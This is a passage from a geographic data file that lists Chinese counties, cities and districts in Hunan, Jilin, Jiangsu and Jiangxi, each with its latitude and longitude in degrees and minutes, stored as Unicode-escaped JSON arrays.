"\u4F1A\u540C\u53BF", "26", "52", "109", "43"], ["\u6E56\u5357\u7701", "\u7EE5\u5B81\u53BF", "26", "35", "110", "9"], ["\u6E56\u5357\u7701", "\u9756\u5DDE\u82D7\u65CF\u4F97\u65CF\u81EA\u6CBB\u53BF", "26", "35", "109", "41"], ["\u6E56\u5357\u7701", "\u901A\u9053\u4F97\u65CF\u81EA\u6CBB\u53BF", "26", "10", "109", "47"], ["\u6E56\u5357\u7701", "\u65B0\u6643\u4F97\u65CF\u81EA\u6CBB\u53BF", "27", "22", "109", "10"], ["\u6E56\u5357\u7701", "\u7389\u5C4F\u4F97\u65CF\u81EA\u6CBB\u53BF", "27", "14", "108", "55"], ["\u6E56\u5357\u7701", "\u8FB0\u6EAA\u53BF", "28", "0", "110", "11"], ["\u6E56\u5357\u7701", "\u51E4\u51F0\u53BF", "27", "57", "109", "36"], ["\u6E56\u5357\u7701", "\u9EBB\u9633\u82D7\u65CF\u81EA\u6CBB\u53BF", "27", "52", "109", "48"], ["\u6E56\u5357\u7701", "\u6CF8\u6EAA\u53BF", "28", "13", "110", "13"], ["\u6E56\u5357\u7701", "\u53E4\u4E08\u53BF", "28", "37", "109", "57"], ["\u6E56\u5357\u7701", "\u4FDD\u9756\u53BF", "28", "43", "109", "39"], ["\u6E56\u5357\u7701", "\u82B1\u57A3\u53BF", "28", "35", "109", "29"], ["\u6E56\u5357\u7701", "\u9F99\u5C71\u53BF", "29", "28", "109", "26"], ["\u6E56\u5357\u7701", "\u6851\u690D\u53BF", "29", "24", "110", "9"], ["\u6E56\u5357\u7701", "\u6C38\u987A\u53BF", "29", "0", "109", "51"], ["\u6E56\u5357\u7701", "\u77F3\u95E8\u53BF", "29", "35", "111", "23"], ["\u6E56\u5357\u7701", "\u4E34\u6FA7\u53BF", "29", "27", "111", "39"], ["\u6E56\u5357\u7701", "\u6148\u5229\u53BF", "29", "25", "111", "7"], ["\u6E56\u5357\u7701", "\u6843\u6E90\u53BF", "28", "54", "111", "29"], ["\u6E56\u5357\u7701", "\u5B89\u5316\u53BF", "28", "23", "111", "13"], ["\u6E56\u5357\u7701", "\u6C85\u9675\u53BF", "28", "28", "110", "23"], ["\u6E56\u5357\u7701", "\u6E86\u6D66\u53BF", "27", "55", "110", "35"], ["\u6E56\u5357\u7701", "\u65B0\u5316\u53BF", "27", "45", "111", "18"], ["\u6E56\u5357\u7701", "\u6E58\u6F6D\u53BF", "27", "47", "112", "57"], ["\u6E56\u5357\u7701", "\u5B81\u4E61\u53BF", "28", "15", "112", "33"], ["\u6E56\u5357\u7701", "\u957F\u6C99\u53BF", "28", "15", "113", "4"], ["\u6E56\u5357\u7701", "\u671B\u57CE\u53BF", "28", "22", "112", "49"], ["\u6E56\u5357\u7701", "\u6E58\u9634\u53BF", "28", "41", "112", "53"], ["\u6E56\u5357\u7701", "\u6843\u6C5F\u53BF", "28", "32", "112", "7"], ["\u6E56\u5357\u7701", "\u6C49\u5BFF\u53BF", "28", "54", "111", "58"], ["\u6E56\u5357\u7701", "\u5B89\u4E61\u53BF", "29", "25", "112", "10"], ["\u6E56\u5357\u7701", "\u6FA7\u53BF", "29", "38", "111", "45"], ["\u6E56\u5357\u7701", "\u534E\u5BB9\u53BF", "29", "31", "112", "34"], ["\u6E56\u5357\u7701", "\u5357\u53BF", "29", "23", "112", "24"], ["\u6E56\u5357\u7701", "\u5CB3\u9633\u53BF", "29", "9", "113", "7"], ["\u6E56\u5357\u7701", "\u5E73\u6C5F\u53BF", "28", "43", "113", "35"], ["\u6E56\u5357\u7701", "\u682A\u6D32\u53BF", "27", "43", "113", "8"], ["\u6E56\u5357\u7701", "\u6842\u4E1C\u53BF", "26", "5", "113", "56"], ["\u6E56\u5357\u7701", "\u708E\u9675\u53BF", "26", "29", "113", "46"], ["\u6E56\u5357\u7701", "\u6C38\u5174\u53BF", "26", "8", "113", "6"], ["\u6E56\u5357\u7701", "\u5B89\u4EC1\u53BF", "26", "42", "113", "16"], ["\u6E56\u5357\u7701", "\u6538\u53BF", "27", "0", "113", "20"], ["\u6E56\u5357\u7701", "\u8336\u9675\u53BF", "26", "48", "113", "32"], ["\u6E56\u5357\u7701", "\u8861\u5C71\u53BF", "27", "14", "112", "52"], ["\u6E56\u5357\u7701", "\u8861\u4E1C\u53BF", "27", "5", "112", "57"], ["\u6E56\u5357\u7701", "\u53CC\u5CF0\u53BF", "27", "27", "112", "12"], ["\u6E56\u5357\u7701", "\u90B5\u4E1C\u53BF", "27", "15", "111", "45"], ["\u6E56\u5357\u7701", "\u7941\u4E1C\u53BF", "26", "47", "112", "7"], ["\u6E56\u5357\u7701", "\u8861\u9633\u53BF", "26", "58", "112", "22"], ["\u6E56\u5357\u7701", "\u7941\u9633\u53BF", "26", "35", "111", "51"], ["\u6E56\u5357\u7701", "\u8861\u5357\u53BF", "26", "44", "112", "40"], ["\u6E56\u5357\u7701", "\u6842\u9633\u53BF", "25", "44", "112", "44"], ["\u6E56\u5357\u7701", "\u5B9C\u7AE0\u53BF", "25", "24", "112", "57"], ["\u6E56\u5357\u7701", "\u65B0\u7530\u53BF", "25", "55", "112", "13"], ["\u6E56\u5357\u7701", "\u5B81\u8FDC\u53BF", "25", "36", "111", "56"], ["\u6E56\u5357\u7701", "\u5609\u79BE\u53BF", "25", "35", "112", "22"], ["\u6E56\u5357\u7701", "\u4E34\u6B66\u53BF", "25", "17", "112", "33"], ["\u6E56\u5357\u7701", "\u84DD\u5C71\u53BF", "25", "22", "112", "11"], ["\u6E56\u5357\u7701", "\u6C5D\u57CE\u53BF", "25", "33", "113", "41"], ["\u5409\u6797\u7701", "\u957F\u6625\u5E02", "43", "54", "125", "19"], ["\u5409\u6797\u7701", "\u56DB\u5E73\u5E02", "43", "10", "124", "21"], ["\u5409\u6797\u7701", "\u901A\u5316\u5E02", "41", "44", "125", "56"], ["\u5409\u6797\u7701", "\u767D\u5C71\u5E02", "41", "56", "126", "25"], ["\u5409\u6797\u7701", "\u8FBD\u6E90\u5E02", "42", "53", "125", "8"], ["\u5409\u6797\u7701", "\u5409\u6797\u5E02", "43", "50", "126", "33"], ["\u5409\u6797\u7701", "\u677E\u539F\u5E02", "45", "8", "124", "49"], ["\u5409\u6797\u7701", "\u767D\u57CE\u5E02", "45", "37", "122", "50"], ["\u5409\u6797\u7701", "\u5EF6\u8FB9\u671D\u9C9C\u65CF\u81EA\u6CBB\u5DDE", "42", "53", "129", "30"], ["\u5409\u6797\u7701", "\u6D2E\u5317\u533A", "45", "37", "122", "51"], ["\u5409\u6797\u7701", "\u5927\u5B89\u5E02", "45", "30", "124", "17"], ["\u5409\u6797\u7701", "\u94C1\u4E1C\u533A", "43", "10", "124", "23"], ["\u5409\u6797\u7701", "\u94C1\u897F\u533A", "43", "9", "124", "21"], ["\u5409\u6797\u7701", "\u671D\u9633\u533A", "43", "50", "125", "17"], ["\u5409\u6797\u7701", "\u5357\u5173\u533A", "43", "52", "125", "20"], ["\u5409\u6797\u7701", "\u4E8C\u9053\u533A", "43", "52", "125", "22"], ["\u5409\u6797\u7701", "\u5BBD\u57CE\u533A", "43", "55", "125", "19"], ["\u5409\u6797\u7701", "\u7EFF\u56ED\u533A", "43", "53", "125", "15"], ["\u5409\u6797\u7701", "\u53CC\u9633\u533A", "43", "31", "125", "40"], ["\u5409\u6797\u7701", "\u9F99\u6F6D\u533A", "43", "55", "126", "34"], ["\u5409\u6797\u7701", "\u660C\u9091\u533A", "43", "53", "126", "34"], ["\u5409\u6797\u7701", "\u4E30\u6EE1\u533A", "43", "49", "126", "34"], ["\u5409\u6797\u7701", "\u8239\u8425\u533A", "43", "50", "126", "32"], ["\u5409\u6797\u7701", "\u6C5F\u6E90\u533A", "42", "3", "126", "35"], ["\u5409\u6797\u7701", "\u516B\u9053\u6C5F\u533A", "41", "56", "126", "24"], ["\u5409\u6797\u7701", "\u53CC\u8FBD\u5E02", "43", "31", "123", "30"], ["\u5409\u6797\u7701", "\u96C6\u5B89\u5E02", "41", "7", "126", "11"], ["\u5409\u6797\u7701", "\u4E34\u6C5F\u5E02", "41", "48", "126", "54"], ["\u5409\u6797\u7701", "\u78D0\u77F3\u5E02", "42", "57", "126", "3"], ["\u5409\u6797\u7701", "\u6866\u7538\u5E02", "42", "58", "126", "44"], ["\u5409\u6797\u7701", "\u6885\u6CB3\u53E3\u5E02", "42", "32", "125", "41"], ["\u5409\u6797\u7701", "\u516C\u4E3B\u5CAD\u5E02", "43", "30", "124", "49"], ["\u5409\u6797\u7701", "\u5FB7\u60E0\u5E02", "44", "32", "125", "42"], ["\u5409\u6797\u7701", "\u4E5D\u53F0\u5E02", "44", "9", "125", "50"], ["\u5409\u6797\u7701", "\u86DF\u6CB3\u5E02", "43", "43", "127", "20"], ["\u5409\u6797\u7701", "\u8212\u5170\u5E02", "44", "25", "126", "57"], ["\u5409\u6797\u7701", "\u6986\u6811\u5E02", "44", "49", "126", "33"], ["\u5409\u6797\u7701", "\u6D2E\u5357\u5E02", "45", "20", "122", "47"], ["\u5409\u6797\u7701", "\u56FE\u4EEC\u5E02", "42", "58", "129", "50"], ["\u5409\u6797\u7701", "\u9F99\u4E95\u5E02", "42", "46", "129", "25"], ["\u5409\u6797\u7701", "\u5EF6\u5409\u5E02", "42", "53", "129", "30"], ["\u5409\u6797\u7701", "\u548C\u9F99\u5E02", "42", "32", "129", "0"], ["\u5409\u6797\u7701", "\u73F2\u6625\u5E02", "42", "52", "130", "22"], ["\u5409\u6797\u7701", "\u6566\u5316\u5E02", "43", "22", "128", "14"], ["\u5409\u6797\u7701", "\u5B81\u6C5F\u533A", "45", "10", "124", "48"], ["\u5409\u6797\u7701", "\u9F99\u5C71\u533A", "42", "54", "125", "7"], ["\u5409\u6797\u7701", "\u897F\u5B89\u533A", "42", "55", "125", "9"], ["\u5409\u6797\u7701", "\u4E8C\u9053\u6C5F\u533A", "41", "46", "126", "2"], ["\u5409\u6797\u7701", "\u4E1C\u660C\u533A", "41", "44", "125", "57"], ["\u5409\u6797\u7701", "\u68A8\u6811\u53BF", "43", "19", "124", "20"], ["\u5409\u6797\u7701", "\u901A\u5316\u53BF", "41", "41", "125", "45"], ["\u5409\u6797\u7701", "\u8F89\u5357\u53BF", "42", "41", "126", "2"], ["\u5409\u6797\u7701", "\u9756\u5B87\u53BF", "42", "24", "126", "48"], ["\u5409\u6797\u7701", "\u629A\u677E\u53BF", "42", "20", "127", "17"], ["\u5409\u6797\u7701", "\u4F0A\u901A\u6EE1\u65CF\u81EA\u6CBB\u53BF", "43", "21", "125", "18"], ["\u5409\u6797\u7701", "\u67F3\u6CB3\u53BF", "42", "17", "125", "44"], ["\u5409\u6797\u7701", "\u4E1C\u4E30\u53BF", "42", "41", "125", "32"], ["\u5409\u6797\u7701", "\u4E1C\u8FBD\u53BF", "42", "55", "124", "60"], ["\u5409\u6797\u7701", "\u519C\u5B89\u53BF", "44", "26", "125", "11"], ["\u5409\u6797\u7701", "\u6C38\u5409\u53BF", "43", "40", "126", "30"], ["\u5409\u6797\u7701", "\u6276\u4F59\u53BF", "44", "59", "126", "1"], ["\u5409\u6797\u7701", "\u524D\u90ED\u5C14\u7F57\u65AF\u8499\u53E4\u65CF\u81EA\u6CBB\u53BF", "45", "7", "124", "49"], ["\u5409\u6797\u7701", "\u9547\u8D49\u53BF", "45", "51", "123", "12"], ["\u5409\u6797\u7701", "\u4E7E\u5B89\u53BF", "45", "1", "124", "1"], ["\u5409\u6797\u7701", "\u957F\u5CAD\u53BF", "44", "17", "123", "59"], ["\u5409\u6797\u7701", "\u901A\u6986\u53BF", "44", "49", "123", "5"], ["\u5409\u6797\u7701", "\u6C6A\u6E05\u53BF", "43", "19", "129", "45"], ["\u5409\u6797\u7701", "\u5B89\u56FE\u53BF", "43", "7", "128", "54"], ["\u5409\u6797\u7701", "\u957F\u767D\u671D\u9C9C\u65CF\u81EA\u6CBB\u53BF", "41", "25", "128", "12"], ["\u6C5F\u82CF\u7701", "\u5357\u4EAC\u5E02", "32", "4", "118", "47"], ["\u6C5F\u82CF\u7701", "\u6DEE\u5B89\u5E02", "33", "37", "119", "1"], ["\u6C5F\u82CF\u7701", "\u9547\u6C5F\u5E02", "32", "12", "119", "27"], ["\u6C5F\u82CF\u7701", "\u5E38\u5DDE\u5E02", "31", "47", "119", "57"], ["\u6C5F\u82CF\u7701", "\u65E0\u9521\u5E02", "31", "34", "120", "18"], ["\u6C5F\u82CF\u7701", "\u82CF\u5DDE\u5E02", "31", "18", "120", "35"], ["\u6C5F\u82CF\u7701", "\u5357\u901A\u5E02", "31", "59", "120", "53"], ["\u6C5F\u82CF\u7701", "\u76D0\u57CE\u5E02", "33", "21", "120", "9"], ["\u6C5F\u82CF\u7701", "\u6CF0\u5DDE\u5E02", "32", "27", "119", "55"], ["\u6C5F\u82CF\u7701", "\u626C\u5DDE\u5E02", "32", "24", "119", "24"], ["\u6C5F\u82CF\u7701", "\u8FDE\u4E91\u6E2F\u5E02", "34", "36", "119", "13"], ["\u6C5F\u82CF\u7701", "\u5BBF\u8FC1\u5E02", "33", "58", "118", "17"], ["\u6C5F\u82CF\u7701", "\u5F90\u5DDE\u5E02", "34", "16", "117", "11"], ["\u6C5F\u82CF\u7701", "\u8FDE\u4E91\u533A", "34", "45", "119", "22"], ["\u6C5F\u82CF\u7701", "\u65B0\u6D66\u533A", "34", "36", "119", "10"], ["\u6C5F\u82CF\u7701", "\u6D77\u5DDE\u533A", "34", "34", "119", "7"], ["\u6C5F\u82CF\u7701", "\u8D3E\u6C6A\u533A", "34", "27", "117", "27"], ["\u6C5F\u82CF\u7701", "\u4E5D\u91CC\u533A", "34", "18", "117", "8"], ["\u6C5F\u82CF\u7701", "\u9F13\u697C\u533A", "34", "17", "117", "11"], ["\u6C5F\u82CF\u7701", "\u4E91\u9F99\u533A", "34", "15", "117", "13"], ["\u6C5F\u82CF\u7701", "\u6CC9\u5C71\u533A", "34", "15", "117", "11"], ["\u6C5F\u82CF\u7701", "\u5BBF\u8C6B\u533A", "33", "57", "118", "19"], ["\u6C5F\u82CF\u7701", "\u5BBF\u57CE\u533A", "33", "58", "118", "15"], ["\u6C5F\u82CF\u7701", "\u695A\u5DDE\u533A", "33", "30", "119", "8"], ["\u6C5F\u82CF\u7701", "\u6DEE\u9634\u533A", "33", "38", "119", "2"], ["\u6C5F\u82CF\u7701", "\u6E05\u6CB3\u533A", "33", "36", "119", "1"], ["\u6C5F\u82CF\u7701", "\u6E05\u6D66\u533A", "33", "35", "119", "2"], ["\u6C5F\u82CF\u7701", "\u4EAD\u6E56\u533A", "33", "24", "120", "8"], ["\u6C5F\u82CF\u7701", "\u76D0\u90FD\u533A", "33", "20", "120", "9"], ["\u6C5F\u82CF\u7701", "\u6E2F\u95F8\u533A", "32", "2", "120", "48"], ["\u6C5F\u82CF\u7701", "\u5D07\u5DDD\u533A", "31", "60", "120", "51"], ["\u6C5F\u82CF\u7701", "\u9097\u6C5F\u533A", "32", "23", "119", "24"], ["\u6C5F\u82CF\u7701", "\u5E7F\u9675\u533A", "32", "23", "119", "26"], ["\u6C5F\u82CF\u7701", "\u7EF4\u626C\u533A", "32", "25", "119", "24"], ["\u6C5F\u82CF\u7701", "\u6816\u971E\u533A", "32", "7", "118", "53"], ["\u6C5F\u82CF\u7701", "\u9F13\u697C\u533A", "32", "4", "118", "46"], ["\u6C5F\u82CF\u7701", "\u7384\u6B66\u533A", "32", "3", "118", "48"], ["\u6C5F\u82CF\u7701", "\u767D\u4E0B\u533A", "32", "2", "118", "47"], ["\u6C5F\u82CF\u7701", "\u5EFA\u90BA\u533A", "32", "2", "118", "45"], ["\u6C5F\u82CF\u7701", "\u79E6\u6DEE\u533A", "32", "1", "118", "48"], ["\u6C5F\u82CF\u7701", "\u6C5F\u5B81\u533A", "31", "57", "118", "51"], ["\u6C5F\u82CF\u7701", "\u4E39\u5F92\u533A", "32", "8", "119", "27"], ["\u6C5F\u82CF\u7701", "\u6DA6\u5DDE\u533A", "32", "12", "119", "24"], ["\u6C5F\u82CF\u7701", "\u4EAC\u53E3\u533A", "32", "12", "119", "28"], ["\u6C5F\u82CF\u7701", "\u65B0\u5317\u533A", "31", "50", "119", "58"], ["\u6C5F\u82CF\u7701", "\u621A\u5885\u5830\u533A", "31", "44", "120", "3"], ["\u6C5F\u82CF\u7701", "\u6B66\u8FDB\u533A", "31", "43", "119", "56"], ["\u6C5F\u82CF\u7701", "\u5929\u5B81\u533A", "31", "45", "119", "56"], ["\u6C5F\u82CF\u7701", "\u949F\u697C\u533A", "31", "47", "119", "56"], ["\u6C5F\u82CF\u7701", "\u60E0\u5C71\u533A", "31", "41", "120", "17"], ["\u6C5F\u82CF\u7701", "\u9521\u5C71\u533A", "31", "36", "120", "21"], ["\u6C5F\u82CF\u7701", "\u5D07\u5B89\u533A", "31", "35", "120", "18"], ["\u6C5F\u82CF\u7701", "\u5317\u5858\u533A", "31", "35", "120", "17"], ["\u6C5F\u82CF\u7701", "\u5357\u957F\u533A", "31", "34", "120", "18"], ["\u6C5F\u82CF\u7701", "\u6EE8\u6E56\u533A", "31", "34", "120", "16"], ["\u6C5F\u82CF\u7701", "\u6CA7\u6D6A\u533A", "31", "18", "120", "38"], ["\u6C5F\u82CF\u7701", "\u5E73\u6C5F\u533A", "31", "19", "120", "38"], ["\u6C5F\u82CF\u7701", "\u91D1\u960A\u533A", "31", "19", "120", "36"], ["\u6C5F\u82CF\u7701", "\u76F8\u57CE\u533A", "31", "22", "120", "38"], ["\u6C5F\u82CF\u7701", "\u5434\u4E2D\u533A", "31", "16", "120", "38"], ["\u6C5F\u82CF\u7701", "\u4EEA\u5F81\u5E02", "32", "16", "119", "11"], ["\u6C5F\u82CF\u7701", "\u53E5\u5BB9\u5E02", "31", "57", "119", "10"], ["\u6C5F\u82CF\u7701", "\u5B9C\u5174\u5E02", "31", "21", "119", "49"], ["\u6C5F\u82CF\u7701", "\u6EA7\u9633\u5E02", "31", "25", "119", "29"], ["\u6C5F\u82CF\u7701", "\u4E39\u9633\u5E02", "31", "60", "119", "34"], ["\u6C5F\u82CF\u7701", "\u626C\u4E2D\u5E02", "32", "14", "119", "49"], ["\u6C5F\u82CF\u7701", "\u91D1\u575B\u5E02", "31", "45", "119", "34"], ["\u6C5F\u82CF\u7701", "\u6CF0\u5174\u5E02", "32", "10", "120", "1"], ["\u6C5F\u82CF\u7701", "\u6C5F\u9634\u5E02", "31", "54", "120", "16"], ["\u6C5F\u82CF\u7701", "\u9756\u6C5F\u5E02", "32", "1", "120", "16"], ["\u6C5F\u82CF\u7701", "\u5F20\u5BB6\u6E2F\u5E02", "31", "52", "120", "33"], ["\u6C5F\u82CF\u7701", "\u5434\u6C5F\u5E02", "31", "10", "120", "38"], ["\u6C5F\u82CF\u7701", "\u6606\u5C71\u5E02", "31", "23", "120", "59"], ["\u6C5F\u82CF\u7701", "\u592A\u4ED3\u5E02", "31", "27", "121", "6"], ["\u6C5F\u82CF\u7701", "\u542F\u4E1C\u5E02", "31", "49", "121", "39"], ["\u6C5F\u82CF\u7701", "\u901A\u5DDE\u5E02", "32", "5", "121", "4"], ["\u6C5F\u82CF\u7701", "\u6D77\u95E8\u5E02", "31", "54", "121", "10"], ["\u6C5F\u82CF\u7701", "\u5E38\u719F\u5E02", "31", "39", "120", "45"], ["\u6C5F\u82CF\u7701", "\u5927\u4E30\u5E02", "33", "12", "120", "28"], ["\u6C5F\u82CF\u7701", "\u4E1C\u53F0\u5E02", "32", "51", "120", "18"], ["\u6C5F\u82CF\u7701", "\u5982\u768B\u5E02", "32", "24", "120", "34"], ["\u6C5F\u82CF\u7701", "\u59DC\u5830\u5E02", "32", "31", "120", "9"], ["\u6C5F\u82CF\u7701", "\u5174\u5316\u5E02", "32", "55", "119", "51"], ["\u6C5F\u82CF\u7701", "\u6C5F\u90FD\u5E02", "32", "26", "119", "33"], ["\u6C5F\u82CF\u7701", "\u9AD8\u90AE\u5E02", "32", "47", "119", "26"], ["\u6C5F\u82CF\u7701", "\u4E0B\u5173\u533A", "32", "5", "118", "44"], ["\u6C5F\u82CF\u7701", "\u90B3\u5DDE\u5E02", "34", "19", "117", "57"], ["\u6C5F\u82CF\u7701", "\u96E8\u82B1\u53F0\u533A", "31", "60", "118", "46"], ["\u6C5F\u82CF\u7701", "\u6D66\u53E3\u533A", "32", "3", "118", "37"], ["\u6C5F\u82CF\u7701", "\u516D\u5408\u533A", "32", "21", "118", "50"], ["\u6C5F\u82CF\u7701", "\u864E\u4E18\u533A", "31", "18", "120", "34"], ["\u6C5F\u82CF\u7701", "\u65B0\u6C82\u5E02", "34", "23", "118", "21"], ["\u6C5F\u82CF\u7701", "\u6CD7\u6D2A\u53BF", "33", "28", "118", "13"], ["\u6C5F\u82CF\u7701", "\u76F1\u7719\u53BF", "33", "0", "118", "29"], ["\u6C5F\u82CF\u7701", "\u6D2A\u6CFD\u53BF", "33", "18", "118", "50"], ["\u6C5F\u82CF\u7701", "\u91D1\u6E56\u53BF", "33", "1", "119", "1"], ["\u6C5F\u82CF\u7701", "\u6EA7\u6C34\u53BF", "31", "39", "119", "1"], ["\u6C5F\u82CF\u7701", "\u9AD8\u6DF3\u53BF", "31", "20", "118", "53"], ["\u6C5F\u82CF\u7701", "\u5982\u4E1C\u53BF", "32", "19", "121", "11"], ["\u6C5F\u82CF\u7701", "\u6D77\u5B89\u53BF", "32", "33", "120", "27"], ["\u6C5F\u82CF\u7701", "\u5B9D\u5E94\u53BF", "33", "14", "119", "18"], ["\u6C5F\u82CF\u7701", "\u5EFA\u6E56\u53BF", "33", "28", "119", "48"], ["\u6C5F\u82CF\u7701", "\u6D9F\u6C34\u53BF", "33", "47", "119", "16"], ["\u6C5F\u82CF\u7701", "\u961C\u5B81\u53BF", "33", "47", "119", "48"], ["\u6C5F\u82CF\u7701", "\u6EE8\u6D77\u53BF", "33", "59", "119", "50"], ["\u6C5F\u82CF\u7701", "\u54CD\u6C34\u53BF", "34", "12", "119", "34"], ["\u6C5F\u82CF\u7701", "\u704C\u5357\u53BF", "34", "5", "119", "21"], ["\u6C5F\u82CF\u7701", "\u704C\u4E91\u53BF", "34", "18", "119", "15"], ["\u6C5F\u82CF\u7701", "\u5C04\u9633\u53BF", "33", "47", "120", "15"], ["\u6C5F\u82CF\u7701", "\u8D63\u6986\u53BF", "34", "50", "119", "7"], ["\u6C5F\u82CF\u7701", "\u4E1C\u6D77\u53BF", "34", "32", "118", "46"], ["\u6C5F\u82CF\u7701", "\u6CD7\u9633\u53BF", "33", "43", "118", "41"], ["\u6C5F\u82CF\u7701", "\u6CAD\u9633\u53BF", "34", "8", "118", "46"], ["\u6C5F\u82CF\u7701", "\u7762\u5B81\u53BF", "33", "54", "117", "57"], ["\u6C5F\u82CF\u7701", "\u94DC\u5C71\u53BF", "34", "11", "117", "10"], ["\u6C5F\u82CF\u7701", "\u6C9B\u53BF", "34", "44", "116", "56"], ["\u6C5F\u82CF\u7701", "\u4E30\u53BF", "34", "42", "116", "36"], ["\u6C5F\u897F\u7701", "\u5357\u660C\u5E02", "28", "41", "115", "51"], ["\u6C5F\u897F\u7701", "\u8D63\u5DDE\u5E02", "25", "50", "114", "56"], ["\u6C5F\u897F\u7701", "\u5409\u5B89\u5E02", "27", "7", "114", "59"], ["\u6C5F\u897F\u7701", "\u840D\u4E61\u5E02", "27", "38", "113", "51"], ["\u6C5F\u897F\u7701", "\u65B0\u4F59\u5E02", "27", "49", "114", "55"], ["\u6C5F\u897F\u7701", "\u5B9C\u6625\u5E02", "27", "48", "114", "23"], ["\u6C5F\u897F\u7701", "\u4E5D\u6C5F\u5E02", "29", "42", "115", "60"], ["\u6C5F\u897F\u7701", "\u629A\u5DDE\u5E02", "27", "60", "116", "21"], ["\u6C5F\u897F\u7701", "\u9E70\u6F6D\u5E02", "28", "16", "117", "4"], ["\u6C5F\u897F\u7701", "\u666F\u5FB7\u9547\u5E02", "29", "16", "117", "10"], ["\u6C5F\u897F\u7701", "\u4E0A\u9976\u5E02", "28", "27", "117", "58"], ["\u6C5F\u897F\u7701", "\u6708\u6E56\u533A", "28", "14", "117", "3"], ["\u6C5F\u897F\u7701", "\u4FE1\u5DDE\u533A", "28", "26", "117", "57"], ["\u6C5F\u897F\u7701", "\u73E0\u5C71\u533A", "29", "18", "117", "12"], ["\u6C5F\u897F\u7701", "\u660C\u6C5F\u533A", "29", "16", "117", "10"], ["\u6C5F\u897F\u7701", "\u4E34\u5DDD\u533A", "27", "59", "116", "21"], ["\u6C5F\u897F\u7701", "\u6E7E\u91CC\u533A", "28", "43", "115", "44"], ["\u6C5F\u897F\u7701", "\u9752\u4E91\u8C31\u533A", "28", "38", "115", "55"], ["\u6C5F\u897F\u7701", "\u9752\u5C71\u6E56\u533A", "28", "41", "115", "57"], ["\u6C5F\u897F\u7701", "\u4E1C\u6E56\u533A", "28", "41", "115", "54"], ["\u6C5F\u897F\u7701", "\u897F\u6E56\u533A", "28", "40", "115", "52"], ["\u6C5F\u897F\u7701", "\u5E90\u5C71\u533A", "29", "41", "115", "59"], ["\u6C5F\u897F\u7701", "\u6D54\u9633\u533A", "29", "44", "115", "59"], ["\u6C5F\u897F\u7701", "\u6E58\u4E1C\u533A", "27", "39", "113", "44"], ["\u6C5F\u897F\u7701", "\u5B89\u6E90\u533A", "27", "39", "113", "52"], ["\u6C5F\u897F\u7701", "\u8881\u5DDE\u533A", "27", "48", "114", "23"], ["\u6C5F\u897F\u7701", "\u6E1D\u6C34\u533A", "27", "48", "114", "56"], ["\u6C5F\u897F\u7701", "\u9752\u539F\u533A", "27", "6", "114", "60"], ["\u6C5F\u897F\u7701", "\u5409\u5DDE\u533A", "27", "7", "114", "59"], ["\u6C5F\u897F\u7701", "\u7AE0\u8D21\u533A", "25", "52", "114", "56"], ["\u6C5F\u897F\u7701", "\u5357\u5EB7\u5E02", "25", "39", "114", "45"], ["\u6C5F\u897F\u7701", "\u745E\u91D1\u5E02", "25", "53", "116", "2"], ["\u6C5F\u897F\u7701", "\u4E95\u5188\u5C71\u5E02", "26", "43", "114", "16"], ["\u6C5F\u897F\u7701", "\u745E\u660C\u5E02", "29", "41", "115", "40"], ["\u6C5F\u897F\u7701", "\u4E30\u57CE\u5E02", "28", "12", "115", "47"], ["\u6C5F\u897F\u7701", "\u9AD8\u5B89\u5E02", "28", "25", "115", "22"], ["\u6C5F\u897F\u7701", "\u6A1F\u6811\u5E02", "28", "4", "115", "32"], ["\u6C5F\u897F\u7701", "\u8D35\u6EAA\u5E02", "28", "17", "117", "13"], ["\u6C5F\u897F\u7701", "\u4E50\u5E73\u5E02", "28", "58", "117", "7"], ["\u6C5F\u897F\u7701", "\u5FB7\u5174\u5E02", "28", "57", "117", "34"], ["\u6C5F\u897F\u7701", "\u5D07\u4E49\u53BF", "25", "42", "114", "18"], ["\u6C5F\u897F\u7701", "\u5927\u4F59\u53BF", "25", "24", "114", "21"], ["\u6C5F\u897F\u7701", "\u4E0A\u72B9\u53BF", "25", "48", "114", "32"], ["\u6C5F\u897F\u7701", "\u8D63\u53BF", "25", "52", "115", "0"], ["\u6C5F\u897F\u7701", "\u4FE1\u4E30\u53BF", "25", "23", "114", "56"], ["\u6C5F\u897F\u7701", "\u9F99\u5357\u53BF", "24", "55", "114", "47"], ["\u6C5F\u897F\u7701", "\u5168\u5357\u53BF", "24", "45", "114", "31"], ["\u6C5F\u897F\u7701", "\u5B9A\u5357\u53BF", "24", "47", "115", "2"], ["\u6C5F\u897F\u7701", "\u5B89\u8FDC\u53BF", "25", "8", "115", "23"], ["\u6C5F\u897F\u7701", "\u5BFB\u4E4C\u53BF", "24", "57", "115", "39"], ["\u6C5F\u897F\u7701", "\u4F1A\u660C\u53BF", "25", "36", "115", "47"], ["\u6C5F\u897F\u7701", "\u5174\u56FD\u53BF", "26", "20", "115", "21"], ["\u6C5F\u897F\u7701", "\u4E8E\u90FD\u53BF", "25", "57", "115", "25"], ["\u6C5F\u897F\u7701", "\u77F3\u57CE\u53BF", "26", "20", "116", "20"], ["\u6C5F\u897F\u7701", "\u5B81\u90FD\u53BF", "26", "29", "116", "1"], ["\u6C5F\u897F\u7701", "\u5E7F\u660C\u53BF", "26", "50", "116", "19"], ["\u6C5F\u897F\u7701", "\u6CF0\u548C\u53BF", "26", "48", "114", "53"], ["\u6C5F\u897F\u7701", "\u5409\u5B89\u53BF", "27", "3", "114", "54"], ["\u6C5F\u897F\u7701", "\u5409\u6C34\u53BF", "27", "13", "115", "8"], ["\u6C5F\u897F\u7701", "\u4E07\u5B89\u53BF", "26", "28", "114", "47"], ["\u6C5F\u897F\u7701", "\u9042\u5DDD\u53BF", "26", "20", "114", "31"], ["\u6C5F\u897F\u7701", "\u6C38\u65B0\u53BF", "26", "57", "114", "14"], ["\u6C5F\u897F\u7701", "\u83B2\u82B1\u53BF", "27", "8", "113", "57"], ["\u6C5F\u897F\u7701", "\u4E0A\u6817\u53BF", "27", "53", "113", "48"], ["\u6C5F\u897F\u7701", "\u82A6\u6EAA\u53BF", "27", "38", "114", "2"], ["\u6C5F\u897F\u7701", "\u5B89\u798F\u53BF", "27", "23", "114", "37"], ["\u6C5F\u897F\u7701", "\u5206\u5B9C\u53BF", "27", "49", "114", "40"], ["\u6C5F\u897F\u7701", "\u4E07\u8F7D\u53BF", "28", "7", "114", "26"], ["\u6C5F\u897F\u7701", "\u5B9C\u4E30\u53BF", "28", "23", "114", "47"], ["\u6C5F\u897F\u7701", "\u4E0A\u9AD8\u53BF", "28", "14", "114", "55"], ["\u6C5F\u897F\u7701", "\u94DC\u9F13\u53BF", "28", "32", "114", "22"], ["\u6C5F\u897F\u7701", "\u4FEE\u6C34\u53BF", "29", "2", "114", "34"], 